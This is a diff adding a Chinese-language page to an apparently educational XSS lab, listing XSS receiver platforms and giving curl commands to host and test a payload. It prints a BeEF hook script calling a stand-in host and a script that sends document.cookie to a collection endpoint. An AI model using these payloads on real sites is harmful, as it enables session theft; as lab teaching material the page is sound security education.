@@ -1,0 +1,29 @@
+<h4>常见 XSS 平台与工具</h4>
+<table>
+<tr><th style="width:200px">平台 / 工具</th><th>特点与用法要点</th></tr>
+<tr><td><b>BeEF</b>（Browser Exploitation Framework）</td><td>开源浏览器控制框架。注入 <code>&lt;script src="http://beef_host:3000/hook.js"&gt;&lt;/script&gt;</code> 后，受害者浏览器出现在 BeEF 面板，可执行命令、键盘记录、弹窗、探测内网。适合授权演练与教学演示。</td></tr>
+<tr><td><b>公开 XSS 平台</b></td><td>在搜索引擎检索 “XSS platform” 可找到在线收信平台，注册后获得收信地址与短链接。注意数据在第三方，且平台可能随时下线，正式项目建议自建。</td></tr>
+<tr><td><b>BlueLotus_XSSReceiver</b></td><td>国内常用的自建 XSS 收信平台，部署在 PHP 环境，支持模板、短链接与收信管理，适合课程与团队内部使用。</td></tr>
+<tr><td><b>Burp Collaborator</b></td><td>Burp Suite 自带带外通道，可验证 Blind XSS（如后台浏览用户反馈时触发）。在 Burp 中复制 Collaborator 地址，放入 payload。</td></tr>
+<tr><td><b>webhook.site</b></td><td>公开 HTTP 收信平台，打开即生成唯一 URL，左侧 Requests 实时显示 <b>Query String / Source IP / User-Agent / Referer / Headers / 命中时间</b>。本关示例流程以它为主：把地址填进 payload 再投放，受害者回连即可在面板看到命中记录。注意平台自己域下的 Cookie 头通常为空，被窃 cookie 在查询参数里。</td></tr>
+</table>
+
+<h4>靶内替代方案命令（curl 复现）</h4>
+<pre>
+# 托管 payload（token 换成页面上的值）
+curl -X POST "{{BASE}}/modules/xss/platform.php?t=TOKEN" \
+     --data-urlencode "payload=&lt;script&gt;new Image().src='{{BASE}}/modules/xss/platform.php?rx=TOKEN&amp;c='+encodeURIComponent(document.cookie);&lt;/script&gt;"
+
+# 模拟回连（真实场景由浏览器自动发起）
+curl "{{BASE}}/modules/xss/platform.php?rx=TOKEN&amp;c=xss_upload_pass%3D%E6%81%AD%E5%96%9C%E4%BD%A0%E5%AE%8C%E6%88%90%E6%9C%AC%E5%85%B3%E6%8C%91%E6%88%98%EF%BC%81"
+
+# 查看收信记录
+curl "{{BASE}}/modules/xss/platform.php?t=TOKEN"
+</pre>
+
+<h4>使用提醒</h4>
+<ul>
+<li>只在授权范围内测试；公开平台可能记录你的测试数据，敏感目标应使用自建平台。</li>
+<li>平台域名可能被目标站点的 CSP 或出口防火墙拦截，必要时改用短域名、HTTPS 或自建域名。</li>
+<li>Blind XSS 的触发时间不可控，收信记录要保留足够长时间并定期查看。</li>
+</ul>
